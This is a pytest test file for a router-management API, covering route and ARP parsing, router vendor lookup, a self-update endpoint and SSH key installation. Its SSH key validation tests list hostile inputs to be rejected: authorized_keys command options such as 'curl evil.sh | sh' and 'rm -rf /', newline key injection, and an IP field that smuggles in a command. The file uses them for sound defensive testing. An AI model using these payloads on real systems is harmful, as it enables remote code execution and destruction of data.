"""Router identification, self-update, and SSH key install."""

from __future__ import annotations

import base64

import pytest

from holdfastbrick_api.runner import CommandResult
from holdfastbrick_api.services import system

# --- /proc/net/route parsing --------------------------------------------------

ROUTE_TEXT = (
    "Iface\tDestination\tGateway \tFlags\tRefCnt\tUse\tMetric\tMask\t\tMTU\tWindow\tIRTT\n"
    "eth0\t00000000\t0101A8C0\t0003\t0\t0\t0\t00000000\t0\t0\t0\n"
    "eth0\t0001A8C0\t00000000\t0001\t0\t0\t0\t00FFFFFF\t0\t0\t0\n"
)


def test_parse_default_route_decodes_little_endian_hex():
    assert system.parse_default_route(ROUTE_TEXT) == ("eth0", "192.168.1.1")


def test_parse_default_route_none_when_no_default():
    no_default = (
        "Iface\tDestination\tGateway \tFlags\tRefCnt\tUse\tMetric\tMask\t\tMTU\tWindow\tIRTT\n"
        "eth0\t0001A8C0\t00000000\t0001\t0\t0\t0\t00FFFFFF\t0\t0\t0\n"
    )
    assert system.parse_default_route(no_default) is None
    assert system.parse_default_route("") is None


# --- OUI vendor lookup --------------------------------------------------------


def test_oui_lookup_known_prefixes():
    assert system.lookup_router_vendor("44:65:7f:aa:bb:cc") == ("xfinity", "Xfinity / Comcast gateway")
    assert system.lookup_router_vendor("9c:3d:cf:00:11:22")[0] == "netgear"
    assert system.lookup_router_vendor("50:c7:bf:00:11:22")[0] == "tplink"
    assert system.lookup_router_vendor("f8:bb:bf:00:11:22")[0] == "eero"
    assert system.lookup_router_vendor("04:d9:f5:00:11:22")[0] == "asus"
    assert system.lookup_router_vendor("c8:a7:0a:00:11:22")[0] == "verizon"
    assert system.lookup_router_vendor("00:1e:46:00:11:22")[0] == "att"


def test_oui_lookup_normalizes_case_and_dashes():
    assert system.lookup_router_vendor("9C-3D-CF-00-11-22")[0] == "netgear"


def test_oui_lookup_unknown():
    assert system.lookup_router_vendor("de:ad:be:ef:00:01") == ("unknown", "Your router")
    assert system.lookup_router_vendor("") == ("unknown", "Your router")


# --- ARP parsing --------------------------------------------------------------

ARP_TEXT = (
    "IP address       HW type     Flags       HW address            Mask     Device\n"
    "192.168.1.1      0x1         0x2         44:65:7F:AA:BB:CC     *        eth0\n"
    "192.168.1.55     0x1         0x0         00:00:00:00:00:00     *        eth0\n"
)


def test_parse_arp_mac_lowercases():
    assert system.parse_arp_mac(ARP_TEXT, "192.168.1.1") == "44:65:7f:aa:bb:cc"


def test_parse_arp_mac_ignores_incomplete_and_missing():
    assert system.parse_arp_mac(ARP_TEXT, "192.168.1.55") == ""
    assert system.parse_arp_mac(ARP_TEXT, "192.168.1.99") == ""


# --- /system/router endpoint --------------------------------------------------


def test_router_requires_token(client):
    test_client, _ = client
    assert test_client.get("/api/v1/system/router").status_code == 401


def test_router_identifies_gateway(authed, monkeypatch, tmp_path):
    test_client, headers = authed
    route_file = tmp_path / "route"
    route_file.write_text(ROUTE_TEXT)
    arp_file = tmp_path / "arp"
    arp_file.write_text(ARP_TEXT)
    monkeypatch.setattr(system, "ROUTE_FILE", route_file)
    monkeypatch.setattr(system, "ARP_FILE", arp_file)

    resp = test_client.get("/api/v1/system/router", headers=headers)
    assert resp.status_code == 200
    assert resp.json() == {
        "gateway_ip": "192.168.1.1",
        "gateway_mac": "44:65:7f:aa:bb:cc",
        "vendor": "Xfinity / Comcast gateway",
        "vendor_key": "xfinity",
        "portal_url": "http://192.168.1.1",
    }


def test_router_degrades_without_proc(authed, monkeypatch, tmp_path):
    test_client, headers = authed
    monkeypatch.setattr(system, "ROUTE_FILE", tmp_path / "missing")
    resp = test_client.get("/api/v1/system/router", headers=headers)
    assert resp.status_code == 200
    assert resp.json() == {
        "gateway_ip": "",
        "gateway_mac": "",
        "vendor": "Your router",
        "vendor_key": "unknown",
        "portal_url": "",
    }


# --- self-update --------------------------------------------------------------


def test_update_requires_token(client):
    test_client, _ = client
    assert test_client.post("/api/v1/system/update").status_code == 401
    assert test_client.get("/api/v1/system/update/status").status_code == 401


def test_update_422_without_repo_dir(authed, monkeypatch):
    test_client, headers = authed
    monkeypatch.setattr(system.settings, "repo_dir", "")
    resp = test_client.post("/api/v1/system/update", headers=headers)
    assert resp.status_code == 422
    assert "HOLDFASTBRICK_REPO_DIR" in resp.json()["detail"]


def test_update_launches_detached_systemd_run(authed, monkeypatch):
    test_client, headers = authed
    monkeypatch.setattr(system.settings, "repo_dir", "/opt/src/HoldfastBrickAPI")
    calls = []

    async def fake_run(argv, timeout=20.0):
        calls.append(argv)
        return CommandResult(ok=True, exit_code=0, stdout="", stderr="")

    monkeypatch.setattr(system, "run", fake_run)
    resp = test_client.post("/api/v1/system/update", headers=headers)
    assert resp.status_code == 200
    assert resp.json()["ok"] is True
    assert calls == [
        [
            "systemd-run",
            "--unit=holdfastbrick-update",
            "--collect",
            "/bin/bash",
            "/opt/src/HoldfastBrickAPI/deploy/self-update.sh",
            "/opt/src/HoldfastBrickAPI",
        ]
    ]


def test_update_status_unknown_unit_is_not_running(authed):
    test_client, headers = authed
    # No systemd in the test environment → gracefully "not running", not 5xx.
    resp = test_client.get("/api/v1/system/update/status", headers=headers)
    assert resp.status_code == 200
    assert resp.json() == {"running": False}


# --- SSH key validation (pure) ------------------------------------------------


def _make_ed25519_key(comment: str | None = "user@example.com") -> str:
    blob = b"\x00\x00\x00\x0bssh-ed25519\x00\x00\x00 " + b"\x07" * 32
    key = f"ssh-ed25519 {base64.b64encode(blob).decode()}"
    return f"{key} {comment}" if comment else key


def test_valid_key_with_and_without_comment():
    assert system.validate_ssh_ed25519_key(_make_ed25519_key()) == _make_ed25519_key()
    assert system.validate_ssh_ed25519_key(_make_ed25519_key(None)) == _make_ed25519_key(None)


def test_valid_key_strips_trailing_newline():
    assert system.validate_ssh_ed25519_key(_make_ed25519_key() + "\n") == _make_ed25519_key()


@pytest.mark.parametrize(
    "bad",
    [
        "",
        "ssh-ed25519",  # no blob
        # Options prefix — would execute a command on login.
        f'command="curl evil.sh | sh" {_make_ed25519_key()}',
        f"no-pty,{_make_ed25519_key()}",
        # Newline injection — would append a second (attacker) key line.
        _make_ed25519_key() + "\n" + _make_ed25519_key(),
        f"ssh-ed25519 AAAA\ncommand=evil {_make_ed25519_key(None)}",
        # Wrong key type.
        "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7 user@example.com",
        # Not base64 / not an ed25519 blob.
        "ssh-ed25519 !!!notbase64!!! user",
        "ssh-ed25519 " + base64.b64encode(b"hello world").decode(),
        # Bad comment charset.
        _make_ed25519_key(None) + " evil;rm -rf /",
        _make_ed25519_key(None) + ' comment"with"quotes',
        # Oversized.
        _make_ed25519_key(None) + " " + "a" * 1200,
    ],
)
def test_invalid_keys_rejected(bad):
    with pytest.raises(ValueError):
        system.validate_ssh_ed25519_key(bad)


# --- /system/ssh-key endpoint -------------------------------------------------


def test_ssh_key_requires_token(client):
    test_client, _ = client
    assert (
        test_client.post("/api/v1/system/ssh-key", json={"public_key": "x"}).status_code == 401
    )


def test_ssh_key_install_and_dedupe(authed, monkeypatch, tmp_path):
    test_client, headers = authed
    keys_file = tmp_path / "root_ssh" / "authorized_keys"
    monkeypatch.setattr(system, "AUTHORIZED_KEYS_FILE", keys_file)
    key = _make_ed25519_key()

    resp = test_client.post("/api/v1/system/ssh-key", json={"public_key": key}, headers=headers)
    assert resp.status_code == 200
    assert resp.json()["message"] == "Key installed"
    assert keys_file.read_text() == key + "\n"
    assert (keys_file.parent.stat().st_mode & 0o777) == 0o700
    assert (keys_file.stat().st_mode & 0o777) == 0o600

    # Same blob (even with a different comment) → not appended again.
    resp = test_client.post(
        "/api/v1/system/ssh-key",
        json={"public_key": _make_ed25519_key("other-comment")},
        headers=headers,
    )
    assert resp.status_code == 200
    assert resp.json()["message"] == "Key already installed"
    assert keys_file.read_text() == key + "\n"


def test_ssh_key_endpoint_rejects_hostile_input(authed, monkeypatch, tmp_path):
    test_client, headers = authed
    keys_file = tmp_path / "authorized_keys"
    monkeypatch.setattr(system, "AUTHORIZED_KEYS_FILE", keys_file)
    hostile = f'command="rm -rf /" {_make_ed25519_key()}'
    resp = test_client.post(
        "/api/v1/system/ssh-key", json={"public_key": hostile}, headers=headers
    )
    assert resp.status_code == 422
    assert not keys_file.exists()


# --- authorized_keys source restriction (from=) -------------------------------

VALID_KEY = (
    "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKfV5l+KcKp0yGpXQVdU2p5DPCJqEV5U6r+xU3Rk8P0y app"
)


def test_build_authorized_line_restricts_to_valid_ip():
    line = system.build_authorized_line(VALID_KEY, "10.0.0.32")
    assert line == f'from="10.0.0.32" {VALID_KEY}'


def test_build_authorized_line_skips_invalid_ip():
    for bad in ("", "testclient", '1.2.3.4",command="rm -rf /', "not-an-ip"):
        assert system.build_authorized_line(VALID_KEY, bad) == VALID_KEY


def test_merge_appends_new_key():
    blob = " ".join(VALID_KEY.split(" ")[:2])
    line = system.build_authorized_line(VALID_KEY, "10.0.0.32")
    content, message = system.merge_authorized_keys("ssh-ed25519 OTHERBLOB other\n", blob, line)
    assert message == "Key installed"
    assert content.endswith(line + "\n")
    assert "OTHERBLOB" in content


def test_merge_updates_from_restriction_when_ip_changes():
    blob = " ".join(VALID_KEY.split(" ")[:2])
    old = f'from="10.0.0.32" {VALID_KEY}\n'
    new_line = system.build_authorized_line(VALID_KEY, "10.0.0.77")
    content, message = system.merge_authorized_keys(old, blob, new_line)
    assert "updated" in message
    assert 'from="10.0.0.77"' in content
    assert 'from="10.0.0.32"' not in content


def test_merge_exact_line_is_noop():
    blob = " ".join(VALID_KEY.split(" ")[:2])
    line = system.build_authorized_line(VALID_KEY, "10.0.0.32")
    content, message = system.merge_authorized_keys(line + "\n", blob, line)
    assert content is None
    assert message == "Key already installed"
